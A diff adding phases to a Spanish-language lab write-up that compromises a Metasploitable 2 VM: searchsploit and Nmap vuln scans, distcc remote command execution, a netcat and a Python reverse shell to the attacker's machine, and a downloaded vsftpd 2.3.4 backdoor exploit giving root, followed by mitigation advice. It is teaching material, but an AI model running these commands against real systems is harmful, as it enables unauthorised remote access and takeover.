@@ -174,7 +174,70 @@ Hallazgos adicionales revelados por los scripts NSE automáticos:
 
 
 
-## Fase 3: Identificación de vulnerabilidades (NSE)
+## Fase 3: Identificación de vulnerabilidades (NSE y Searchsploit)
+
+### 3.1 Searchsploit con output de Nmap
+
+Searchsploit puede leer directamente el XML generado por Nmap y 
+buscar exploits conocidos para cada servicio detectado:
+
+```bash
+searchsploit -x --nmap results.xml
+```
+
+<img width="1918" height="793" alt="image" src="https://github.com/user-attachments/assets/c29469e9-c6f6-45d6-b93f-5ba48bc78b05" />
+
+Para vsftpd 2.3.4 se encontraron dos exploits directamente relevantes:
+
+| Exploit | Path |
+|---------|------|
+| vsftpd 2.3.4 – Backdoor Command Execution | unix/remote/49757.py |
+| vsftpd 2.3.4 – Backdoor Command Execution (Metasploit) | unix/remote/17491.rb |
+
+
+
+### 3.2 NSE con scripts de vulnerabilidad
+
+El NSE (Nmap Scripting Engine) permite ejecutar scripts especializados
+en Lua directamente desde Nmap. El flag `--script vuln` carga todos
+los scripts de la categoría "vuln", que verifican activamente si cada
+servicio es explotable.
+
+```bash
+nmap -sV -p53,6000,111,139,25,23,21,22,445,514,513,512,80,\
+1524,1099,2121,3306,3632,5432,5900,2049,6200,6667,6697,\
+8009,8180,8787 --script vuln 192.168.124.133
+```
+<img width="1918" height="1017" alt="image" src="https://github.com/user-attachments/assets/357f1db6-341d-40f5-8595-a12867950586" />
+
+
+Duración del escaneo: 346 segundos (≈ 6 minutos).
+
+### Vulnerabilidades críticas confirmadas
+
+| Puerto | Servicio | CVE | CVSS | Estado |
+|--------|----------|-----|------|--------|
+| 21/tcp | vsftpd 2.3.4 | CVE-2011-2523 | 10.0 | VULNERABLE |
+| 3632/tcp | distccd v1 | CVE-2004-2687 | 9.3 | VULNERABLE |
+| 1099/tcp | Java RMI | — | Alta | VULNERABLE |
+| 5432/tcp | PostgreSQL | CVE-2014-0224 | Alta | VULNERABLE |
+| 25/tcp | SMTP | CVE-2014-3566 | Media | VULNERABLE |
+
+### Detalle: distcc CVE-2004-2687
+
+El script NSE `distcc-cve2004-2687` confirmó que el servicio distcc
+en el puerto 3632 permite ejecutar comandos arbitrarios de forma
+remota sin autenticación. La prueba de concepto interna ejecutó `id`
+y obtuvo respuesta:
+
+```
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
+```
+
+Esto confirma ejecución remota de código (RCE) con el usuario daemon.
+Este será el vector de ataque principal en la Fase 4.
+
+<img width="961" height="327" alt="image" src="https://github.com/user-attachments/assets/44299079-3765-45a2-bac3-49abc42b37ac" />
 
 
 
@@ -182,6 +245,275 @@ Hallazgos adicionales revelados por los scripts NSE automáticos:
 
 
 ## Fase 4: Explotación - distcc (CVE-2004-2687)
+
+### ¿Qué es distcc y por qué es vulnerable?
+
+distcc es un sistema de compilación distribuida que permite a 
+servidores remotos compilar código C/C++ enviado por clientes.
+La vulnerabilidad CVE-2004-2687 existe porque versiones anteriores
+a la 3.1 no validan ni autentican los comandos recibidos, permitiendo
+que cualquier cliente remoto ejecute comandos arbitrarios en el 
+servidor disfrazándolos de tareas de compilación.
+
+- Divulgación: 2002-02-01
+- CVSSv2: 9.3 (HIGH)
+- Vector: AV:N/AC:M/Au:N — Red, sin autenticación requerida
+
+### 4.1 Localizar e inspeccionar el script NSE
+
+```bash
+locate distcc-cve2004-2687.nse
+mousepad /usr/share/nmap/scripts/distcc-cve2004-2687.nse
+```
+
+El script documenta su uso interno:
+```
+nmap -p 3632 <ip> --script distcc-exec \
+  --script-args="distcc-exec.cmd='id'"
+```
+
+### 4.2 Verificación de RCE con ifconfig
+
+Se ejecutó el comando `ifconfig` en la máquina víctima de forma
+remota usando el script NSE:
+
+```bash
+nmap -p 3632 --script distcc-cve2004-2687 \
+  --script-args="distcc-cve2004-2687.cmd='ifconfig'" \
+  192.168.124.133
+```
+
+El output devuelto por Metasploitable confirmó ejecución remota:
+
+```
+eth0  inet addr:192.168.124.133  Bcast:192.168.124.255
+      Mask:255.255.255.0
+```
+
+> ✅ RCE confirmado: comandos ejecutados remotamente en la víctima
+> sin credenciales, en el contexto del usuario `daemon`.
+
+<img width="818" height="896" alt="image" src="https://github.com/user-attachments/assets/42322d4a-3af0-4edc-950c-e462d985eebc" />
+
+
+
 ## Fase 5: Reverse Shell
+### Concepto
+
+Una reverse shell invierte la dirección de la conexión: en lugar de
+que el atacante se conecte a la víctima, es la víctima quien se
+conecta al atacante. Esto permite evadir firewalls que bloquean
+conexiones entrantes pero permiten las salientes.
+
+El ataque requiere dos componentes simultáneos:
+- Un **listener** en Kali esperando la conexión entrante
+- Un **payload** ejecutado en la víctima via distcc que inicia la conexión
+
+### 5.1 Preparar el listener
+
+```bash
+nc -nlvp 4444
+```
+
+| Flag | Significado |
+|------|-------------|
+| `-n` | No resolver DNS |
+| `-l` | Modo escucha (listen) |
+| `-v` | Verbose — mostrar conexiones |
+| `-p` | Puerto a escuchar |
+
+### 5.2 Ejecutar el payload via distcc
+
+```bash
+nmap -p 3632 --script distcc-cve2004-2687 \
+  --script-args="distcc-cve2004-2687.cmd='nc -e /bin/sh 192.168.124.128 4444'" \
+  192.168.124.133
+```
+
+El comando `nc -e /bin/sh` ordena a netcat que ejecute `/bin/sh`
+y conecte su entrada/salida a nuestra IP y puerto.
+
+### 5.3 Conexión establecida
+
+```
+connect to [192.168.124.128] from (UNKNOWN) [192.168.124.133] 35902
+```
+
+<img width="1918" height="498" alt="image" src="https://github.com/user-attachments/assets/5cde34e5-31f8-45a1-95eb-639be742c012" />
+
+### 5.4 Confirmación de acceso
+
+Una vez establecida la conexión, se confirmó ejecución de comandos
+en la máquina víctima:
+
+```
+id
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
+
+ls
+5128.jsvc_up
+distcc_20526346.stdout
+distcc_267f6346.stderr
+gconfd-msfadmin
+orbit-msfadmin
+```
+
+El directorio de trabajo es `/tmp` de Metasploitable. Los archivos
+`distcc_*.stdout` y `distcc_*.stderr` son rastros de las tareas de
+compilación que distcc procesó anteriormente.
+
+### 5.5 Upgrade a shell interactiva
+
+La shell obtenida via netcat es no-interactiva: no tiene prompt,
+no permite usar Ctrl+C sin cerrar la conexión, y no soporta
+comandos como `su`. Se mejora usando el módulo `pty` de Python:
+
+```bash
+python -c 'import pty;pty.spawn("/bin/bash")'
+```
+
+Esto crea un pseudo-terminal completo, convirtiendo la shell
+básica en una sesión bash interactiva con prompt.
+
+<img width="1918" height="491" alt="image" src="https://github.com/user-attachments/assets/b71e45d7-7e51-4a90-a7f9-44ee723e9bc9" />
+
+
+> 📌 El usuario `daemon` tiene privilegios limitados. En un
+> pentest real, el siguiente paso sería escalar privilegios
+> hacia root. En este laboratorio continuamos con la
+> explotación de vsFTPd que sí otorga acceso root directo.
+
+
+
 ## Fase 6: Explotación - vsFTPd 2.3.4 (CVE-2011-2523)
+
+### ¿Qué es este backdoor?
+
+En 2011, un atacante desconocido comprometió el repositorio oficial
+de vsFTPd e introdujo un backdoor en la versión 2.3.4. El mecanismo
+es simple: si el nombre de usuario contiene la cadena `:)` durante
+el login FTP, el servidor abre automáticamente una shell en el
+puerto 6200 con privilegios de **root**. Fue descubierto y removido
+rápidamente, pero Metasploitable lo incluye intencionalmente.
+
+- CVE: CVE-2011-2523
+- CVSS: 10.0 (máximo)
+- Privilegios obtenidos: root (uid=0)
+
+### 6.1 Descargar y preparar el exploit
+
+```bash
+wget https://gist.githubusercontent.com/thaisingle/e2af5a83f06dc91\
+fdf60faa23f43ffec/raw/ba8505125ccd2f9ae30c56903f2e817aa96b1854/\
+vsFtpdBackdoor.py
+
+chmod +x vsFtpdBackdoor.py
+```
+
+El exploit está escrito en Python 2. Al abrirlo con `mousepad` se
+puede ver que acepta dos argumentos: IP del objetivo y puerto FTP.
+
+### 6.2 Ejecutar el exploit
+
+```bash
+./vsFtpdBackdoor.py 192.168.124.133 21
+```
+
+Salida obtenida:
+```
+[*] Try to open port 6200
+[*] Open Port 6200 completed
+[*] Pwnage Complete
+```
+
+### 6.3 Verificación de acceso root
+
+```
+id
+uid=0(root) gid=0(root)
+```
+
+<img width="377" height="235" alt="image" src="https://github.com/user-attachments/assets/eb1712d4-8b14-421f-89fc-b4b8c5f3931d" />
+
+
+> ⚠️ A diferencia de distcc que otorgó acceso como `daemon`
+> (usuario limitado), vsFTPd 2.3.4 otorga acceso directo como
+> `root` — el usuario con máximos privilegios en Linux.
+> Esto permite leer cualquier archivo, modificar el sistema,
+> crear usuarios, etc.
+
+### 6.4 Upgrade a shell interactiva
+
+La shell obtenida es básica. Para hacerla interactiva:
+
+```bash
+python -c 'import pty;pty.spawn("/bin/bash")'
+```
+
+<img width="490" height="366" alt="image" src="https://github.com/user-attachments/assets/6bdfcdbe-2230-4bdd-acb6-8a06c7890d7b" />
+
+
+Para obtener una reverse shell root completa desde esta sesión:
+
+```python
+python -c 'import sys,socket,os,pty;\
+s=socket.socket();\
+s.connect(("192.168.124.128",4444));\
+[os.dup2(s.fileno(),fd) for fd in (0,1,2)];\
+pty.spawn("/bin/sh")'
+```
+
+<img width="1918" height="997" alt="image" src="https://github.com/user-attachments/assets/65d0903f-6957-4637-8f91-b365520f8874" />
+
+
 ## Conclusiones y lecciones aprendidas
+
+### Resumen del ataque
+
+A partir de una máquina en la misma red, se logró comprometer
+completamente Metasploitable 2 usando únicamente herramientas
+incluidas en Kali Linux, sin credenciales previas.
+
+| Fase | Herramienta | Resultado |
+|------|-------------|-----------|
+| Reconocimiento | netdiscover, nmap -sn | Host objetivo identificado |
+| Escaneo | nmap -O, -sV, Zenmap | 29 puertos mapeados con versiones |
+| Vulnerabilidades | NSE --script vuln, searchsploit | 2 vectores críticos confirmados |
+| Explotación 1 | distcc NSE script | RCE como daemon (CVE-2004-2687) |
+| Reverse shell | netcat + python pty | Shell interactiva en víctima |
+| Explotación 2 | vsFtpdBackdoor.py | Root completo (CVE-2011-2523) |
+
+### Lecciones aprendidas
+
+**1. El escaneo completo de puertos es imprescindible.**
+El puerto 3632 (distcc) no aparece en el top 1000 de Nmap.
+Sin `-p-` habríamos perdido el vector de ataque principal.
+
+**2. Las versiones de software importan más que el servicio.**
+vsftpd 2.3.4 parece un servidor FTP normal — solo la versión
+exacta revela el backdoor. El version scanning (`-sV`) es
+crítico en cualquier auditoría.
+
+**3. Los servicios olvidados son una puerta trasera.**
+distcc es una herramienta de desarrollo que no debería estar
+expuesta en producción. Servicios innecesarios activos amplían
+la superficie de ataque.
+
+**4. Un backdoor en la cadena de suministro es devastador.**
+El backdoor de vsFTPd fue introducido en el repositorio oficial.
+Esto ilustra la importancia de verificar la integridad del
+software descargado (checksums, firmas digitales).
+
+**5. NSE convierte Nmap en una plataforma de explotación.**
+Los scripts NSE permiten pasar del descubrimiento a la
+explotación sin cambiar de herramienta, haciendo de Nmap
+algo mucho más poderoso que un simple escáner de puertos.
+
+### Recomendaciones de mitigación
+
+- Mantener todos los servicios actualizados
+- Deshabilitar servicios innecesarios (principio de mínimo privilegio)
+- Implementar firewall con reglas de salida estrictas
+- Verificar integridad del software con checksums oficiales
+- Monitorizar conexiones salientes inusuales (reverse shells)
+- Usar IDS/IPS para detectar escaneos intensivos tipo `-A`
